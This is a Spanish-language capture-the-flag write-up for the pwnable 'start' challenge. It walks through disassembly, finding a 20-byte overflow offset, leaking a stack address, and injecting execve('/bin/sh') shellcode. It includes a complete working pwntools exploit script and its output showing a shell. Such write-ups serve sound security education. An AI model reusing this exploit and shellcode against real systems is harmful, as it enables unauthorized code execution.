En este ejercicio nos dan un binario con las siguientes características y protecciones:

```c
file start                                                                                                                  
start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped
```

```c
pwndbg> checksec
Arch:     i386
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Parece muy básico, vamos a mirar sus funciones con radare2:

```c
afl
0x08048060    1     61 entry0
```

Como podemos ver, solo tiene una función; vamos a ver qué contiene:

```nasm
[0x08048060]> pdf @ entry0 
            ;-- section..text:
            ;-- _start:
            ;-- eip:
┌ 61: entry0 ();
│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text
│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; "\1\xc0@\u0340" ; int status
│           0x08048066      31c0           xor eax, eax
│           0x08048068      31db           xor ebx, ebx
│           0x0804806a      31c9           xor ecx, ecx
│           0x0804806c      31d2           xor edx, edx
│           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
│           0x08048073      6874686520     push 0x20656874             ; 'the '
│           0x08048078      6861727420     push 0x20747261             ; 'art '
│           0x0804807d      6873207374     push 0x74732073             ; 's st'
│           0x08048082      684c657427     push 0x2774654c             ; 'Let\''
│           0x08048087      89e1           mov ecx, esp
│           0x08048089      b214           mov dl, 0x14                ; 20
│           0x0804808b      b301           mov bl, 1
│           0x0804808d      b004           mov al, 4
│           0x0804808f      cd80           int 0x80
│           0x08048091      31db           xor ebx, ebx
│           0x08048093      b23c           mov dl, 0x3c                ; '<' ; 60
│           0x08048095      b003           mov al, 3
│           0x08048097      cd80           int 0x80
│           0x08048099      83c414         add esp, 0x14
└           0x0804809c      c3             ret
```

El programa hace lo siguiente:

* Pushea `ESP`.
* Pushea la dirección de la función `exit`.
* Limpia los registros.
* Pushea el string "`Let's Start the CTF`".
* Prepara y ejecuta un `write()`.
* Prepara y ejecuta un `read()`.
* Aumenta el ESP en 20 bytes.

¿Qué podemos hacer con esto? Este programa tiene un buffer overflow, ya que el `read` lee 60 bytes, pero el offset hasta la dirección de retorno es menor. Podemos comprobar esto usando `pwndbg` y `cyclic` para encontrar ese offset:

```
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Let's start the CTF:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

EIP  0x61616166 ('faaa') # Miramos el registro EIP
 
pwndbg> cyclic -l faaa
Found at offset 20 # Efectivamente, 20 bytes. Con lo cual hay overflow
```

Puesto que podemos controlar el EIP, tenemos control del flujo del programa, por lo que podemos saltar a donde queramos. En este caso, el programa es muy simple y no hay suficientes gadgets para hacer un ROP. Como el stack es ejecutable (ya que al principio vimos que NX está desactivado), podemos intentar introducir shellcode y ejecutarlo. Para esto vamos a necesitar tener un leak del stack para poder calcular la dirección donde empieza nuestro shellcode. ¿Cómo conseguimos ese leak?

Si repasamos el código, podemos recordar que al final del programa sucede esto:

```nasm
0x08048099      83c414         add esp, 0x14
```

Al mover el ESP, si pudiéramos volver a llamar a `write`, volvería a imprimir por pantalla valores desde el ESP; y como el valor ahora es mayor, podría llegar a imprimir el `push esp` que se hace al principio del programa. Vamos a intentarlo:

```python
def main():
    io = conn()

	padding = b"a" * 20
    payload = padding + p32(0x08048087)
    
    io.recvuntil(b"Let's start the CTF:")
    io.send(payload)

    eip = u32(io.recv(4))
    print(f"Dirección ESP: {hex(eip)}")

    io.interactive()
```

```c
python3 solve.py LOCAL                                                                                                                                   3.13.7  19:13 
[*] '/home/ub1cu0/Escritorio/PWN/pwnable/start/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/pwnable/start/start': pid 55204
Longitud: 44
Dirección ESP: 0xffa1dfd0
[*] Switching to interactive mode
\x01\x00\x00\x00\xa3\xfe\xa1\xff\x00\x00\x00\x00\xd3\xfe\xa1\xff$  
```

¡Tenemos la dirección! Ahora tenemos que conseguir inyectar un shellcode y mandar el flujo allí. Como hemos mandado nuestro payload al `write`, tendremos un `read` después, así que ahí ya podemos escribir el shellcode:

```python
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
print(f"Longitud: {len(shellcode)}")
```

El script completo quedaría así:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./start")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b _start
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()

    shellcode = asm('\n'.join([
        'push %d' % u32('/sh\0'),
        'push %d' % u32('/bin'),
        'xor edx, edx',
        'xor ecx, ecx',
        'mov ebx, esp',
        'mov eax, 0xb',
        'int 0x80',
    ]))
    
    print(f"Longitud: {len(shellcode)}")

    padding = b"a" * 20

    payload = padding + p32(0x08048087)
    
    io.recvuntil(b"Let's start the CTF:")
    io.send(payload)

    eip = u32(io.recv(4))
    print(f"Dirección ESP: {hex(eip)}")

    payload = padding + p32(eip+0x14) + shellcode # Para conseguir el offset vale con debuggear un poco dinámicamente para que cuadre bien con nuestro shellcode

    io.send(payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
PWN/pwnable/start ❯ python3 solve.py LOCAL                                       
[*] '/home/ub1cu0/Escritorio/PWN/pwnable/start/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/pwnable/start/start': pid 64626
/usr/lib/python3.13/site-packages/pwnlib/context/__init__.py:1709: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return function(*a, **kw)
Longitud: 23
Dirección ESP: 0xfffc8a90
[*] Switching to interactive mode
\x01\x00\x00\x00\xa3\x8e\xfc\xff\x00\x00\x00\x00ӎ\xfc\xff$ whoami
ub1cu0
$  
```

¡Funciona!
